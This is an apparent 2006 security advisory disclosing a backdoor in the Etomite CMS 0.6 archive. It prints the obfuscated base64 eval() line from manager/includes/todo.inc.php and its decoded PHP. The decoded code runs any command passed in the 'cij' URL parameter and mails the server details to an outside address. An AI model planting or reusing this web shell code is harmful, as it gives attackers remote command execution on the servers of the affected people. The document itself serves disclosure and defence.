What is Etomite?
---------------
[description taken from from the author's site]

Etomite is a Content Management System, which allows you to remotely
administer your website from anywhere that you have an Internet
Connection and a compatible Web-Browser.



Vulnerability Description:
-------------------------

Etomite source code contain a backdoor component that 
allow remote users to execute arbitrary code on the host
that Etomite was installed on.



Deep Focus:
----------

As of this writing (01-19-2006), the current stable version (0.6)
available from http://www.etomite.org/ has the following MD5 sum:

f173bcb275b7344d5cd5a1f6315919e6

[It is possible for other backdoored archives to have different MD5 sums]


Malicious code is present in the 'manager/includes/todo.inc.php' file,
where we can find an encoded data with the base64 algorithm:

eval(base64_decode("JGhhbmRsZT1wb3BlbigkX0dFVFtjaWpdLiIgMj4mMSIsInIiKTt3aGlsZSghZmVvZigkaGFuZGxlKSl7JGxpbmU9ZmdldHMoJGhhbmRsZSk7aWYoc3RybGVuKCRsaW5lKT49MSl7ZWNobyAkbGluZTt9fXBjbG9zZSgkaGFuZGxlKTttYWlsKCJjaWpmZXJAbmV0dGkuZmkiLCIiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLCJFcnJvciBDb2RlICM3MjA5MzgiKTs="));



The result of base64-decoding is reported below:

$handle=popen($_GET[cij]." 2>&1","r");
while(!feof($handle))
 {
  $line=fgets($handle);
  if(strlen($line)>=1)
     {
       echo $line;
     }
  }
pclose($handle);
mail("cijfer@...ti.fi","".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'],"Error Code #720938");


Analyzing decoded data is easy to understand that:

- The popen() function executes the command specified by the variable
 named 'cij' provided to the script via URL query string

- An e-mail message, where there is reported the filename of the currently
  executing script and the server name,  will be sent to 'cijfer@...ti.fi'
